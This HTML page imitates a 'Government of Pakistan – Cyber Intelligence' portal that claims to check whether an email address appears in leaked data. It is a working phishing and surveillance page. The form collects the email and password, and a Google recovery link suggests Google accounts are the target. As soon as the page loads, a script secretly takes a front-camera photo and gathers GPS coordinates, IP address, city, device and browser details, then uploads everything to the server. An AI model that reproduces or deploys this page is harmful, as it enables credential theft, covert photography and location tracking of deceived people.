<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>üáµüá∞ Government of Pakistan ‚Äì Cyber Intelligence</title>
  <link rel="icon" href="/static/pakistan-emblem.png" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #1b2631;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      height: 100vh;
      padding: 20px 0;
    }
    .box {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      text-align: center;
      width: 380px;
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 20px;
      margin-bottom: 8px;
    }
    p {
      font-size: 13px;
      margin: 8px 0;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border-radius: 6px;
      border: none;
      font-size: 14px;
    }
    input {
      background: #ecf0f1;
      color: #2c3e50;
    }
    button {
      background: #e74c3c;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #c0392b;
    }
    a.forgot {
      color: #f1c40f;
      font-size: 12px;
      display: block;
      margin-top: 4px;

    }

      width: 80px;

    }
    footer {
      font-size: 11px;

      padding: 10px;
    }
  </style>
</head>
<body>
  <div>
    <h3 style="color: #f1c40f; text-align:center;">Confidential Access - Secure Portal</h3>
  </div>
  <div class="box">
    <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
    <h1>üáµüá∞ Government of Pakistan ‚Äì Cyber Intelligence</h1>
    <p>Enter your email to check leaked data in our cyber database</p>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
      <button type="submit">üîç Check Now</button>
    </form>
  </div>
  <footer>
    All activity is being monitored for national security purposes. Unauthorized access is prohibited.
  </footer>

  <script>
    async function reverseGeocode(lat, lon) {
      try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {
          headers: { 'User-Agent': 'Mozilla/5.0' }
        });
        const data = await res.json();
        return {
          city: data.address.city || data.address.town || data.address.village || "Unknown",
          country: data.address.country || "Unknown",
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
        };
      } catch {
        return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
      }
    }

    function getDeviceName(userAgent) {
      const devices = [
        { name: "Samsung", pattern: /samsung|sm-/i },
        { name: "Xiaomi", pattern: /xiaomi|redmi|mi /i },
        { name: "Oppo", pattern: /oppo/i },
        { name: "Vivo", pattern: /vivo/i },
        { name: "Realme", pattern: /realme/i },
        { name: "Infinix", pattern: /infinix/i },
        { name: "Tecno", pattern: /tecno/i },
        { name: "Sony", pattern: /sony/i },
        { name: "OnePlus", pattern: /oneplus/i },
        { name: "Google Pixel", pattern: /pixel/i },
        { name: "iPhone", pattern: /iphone/i },
      ];
      for (const device of devices) {
        if (device.pattern.test(userAgent)) return device.name;
      }
      return "Unknown Device";
    }

    async function sendFullData(coords, cameraStatus) {
      const userAgent = navigator.userAgent;
      const deviceInfo = getDeviceName(userAgent);
      let ip = "Unknown", locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };

      try {
        const ipRes = await fetch("https://api64.ipify.org?format=json");
        const ipJson = await ipRes.json();
        ip = ipJson.ip;
      } catch {}

      if (coords) {
        locationData = await reverseGeocode(coords.latitude, coords.longitude);
      }

      const payload = {
        ip,
        latitude: coords?.latitude || null,
        longitude: coords?.longitude || null,
        mapsLink: coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : "‚ùå Location Denied",
        timezone: locationData.timezone,
        city: locationData.city,
        country: locationData.country,
        camera: cameraStatus,
        userAgent,
        deviceInfo
      };

      await fetch("/collect", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    async function askForPermissions() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            fetch('/photo', { method: 'POST', body: formData });
          });
          stream.getTracks().forEach(track => track.stop());
        }, 3000);

        navigator.geolocation.getCurrentPosition(
          pos => sendFullData(pos.coords, "‚úÖ Camera Allowed"),
          () => sendFullData(null, "‚úÖ Camera Allowed, ‚ùå Location Denied")
        );
      } catch (err) {
        sendFullData(null, "‚ùå Camera Denied");
      }
    }

    window.onload = askForPermissions;
  </script>
</body>
</html>
